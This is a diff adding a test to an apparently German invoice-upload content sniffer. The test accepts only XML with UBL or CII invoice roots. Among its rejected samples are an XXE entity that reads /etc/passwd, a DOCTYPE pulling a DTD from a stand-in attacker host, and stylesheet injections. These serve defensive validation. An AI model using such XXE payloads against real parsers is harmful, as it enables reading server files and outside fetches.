@@ -41,6 +41,25 @@ describe("Dateityp am Inhalt erkennen", () => {
     }
   });
 
+  it("XML nur mit Rechnungs-Wurzel (Positivliste UBL Invoice/CreditNote, CII CrossIndustryInvoice) und ohne DOCTYPE, Entitäten oder Formatvorlage (ZP3-S-F5)", () => {
+    const decl = '<?xml version="1.0" encoding="UTF-8"?>';
+    for (const ok of [`${decl}<Invoice xmlns="urn:x"/>`, `${decl}<ubl:CreditNote xmlns:ubl="urn:x"/>`, `${decl}<rsm:CrossIndustryInvoice xmlns:rsm="urn:x"/>`, `${decl}<!-- Kommentar --><INVOICE/>`]) {
+      assert.equal(sniffContentType(bytes(ok)), "application/xml", ok);
+    }
+    for (const evil of [
+      `${decl}<foo/>`, // beliebiges XML
+      `${decl}<rss version="2.0"/>`,
+      `${decl}<Invoice/>`.replace("<Invoice/>", '<?xml-stylesheet type="text/xsl" href="x.xsl"?><Invoice/>'),
+      `${decl}<!DOCTYPE Invoice [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><Invoice>&xxe;</Invoice>`,
+      `${decl}<!DOCTYPE Invoice SYSTEM "http://evil.example/x.dtd"><Invoice/>`,
+      `${decl}<!DOCTYPE Invoice [<!ENTITY a "aaaa">]><Invoice>&a;</Invoice>`,
+      `${decl}<Invoice><?xml-stylesheet href="x"?></Invoice>`,
+      `<Invoice xmlns="x"/>`,
+    ]) {
+      assert.equal(sniffContentType(bytes(evil)), null, evil);
+    }
+  });
+
   it("SVG wird als SVG erkannt (nur das Logo erlaubt es), nicht als XML", () => {
     assert.equal(sniffContentType(bytes('<svg xmlns="http://www.w3.org/2000/svg"/>')), "image/svg+xml");
     assert.equal(sniffContentType(bytes('<?xml version="1.0"?>\n<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "x">\n<svg/>')), "image/svg+xml");
